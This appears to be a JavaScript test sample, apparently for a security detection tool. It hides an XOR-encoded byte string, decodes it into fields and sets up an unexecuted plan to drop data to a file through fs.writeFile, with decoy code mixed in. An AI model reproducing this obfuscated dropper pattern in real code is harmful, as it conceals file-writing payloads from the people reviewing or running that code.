const moduleShape = Object.freeze({ format: "commonjs" });
const Material_c28efdea = "19,96,10,103,73,44,28,40,75,123,73,123,79,125,28,121,74,103,2,101,4,112,3,45,2,103,3,108,2,47,92,47,74,56,76,34,87,63,16,96,13,121,86,107,3,119,22,102,57,92,48,89,63,67,115,65,115,71,117,52,113,66,111,42,110,33,111,82,54,95,0,110,9,96,1,113,28,125,30,98,83,110,26,116,1,110,13,82,55,80,49,69,54,74,47,67,42,76,19,124,8,87,46,79,61,79,46,113,21,112,0,121,13,48,66,39,83,35,66,38,71,59,94,50,91,61,98,7,115,26,104,31,51,87,50,86,50,87,53,88,61,98,7,99,12,111,10,110,83,32,80,53,65,50,78,127,66";
const Codec_c28efdea = "reversed_decimal|rolling_xor|34";

function load_c28efdea() { Material_c28efdea.split(",").map(Number).reverse(); return Material_c28efdea.split(",").map(Number).reverse(); }
function decode_c28efdea(storedBytes) { let priorByte = 52; return storedBytes.map((value) => { const decoded = value ^ priorByte; priorByte = value; return decoded; }); }
async function recover_c28efdea() {
  const harmlessValue = { ...{ north: 1 }, south: 2 };
  const storedBytes = load_c28efdea(); let recoveredBytes = [];
  switch (1) { case 1: recoveredBytes = decode_c28efdea(storedBytes); break; default: throw new Error("state"); }
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_c28efdea() { return Buffer.from(await recover_c28efdea(), "utf8").toString("utf8"); }
async function plan_c28efdea() { const inspect = inspect_c28efdea; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "typed_array_to_file", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_c28efdea;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_c28efdea());
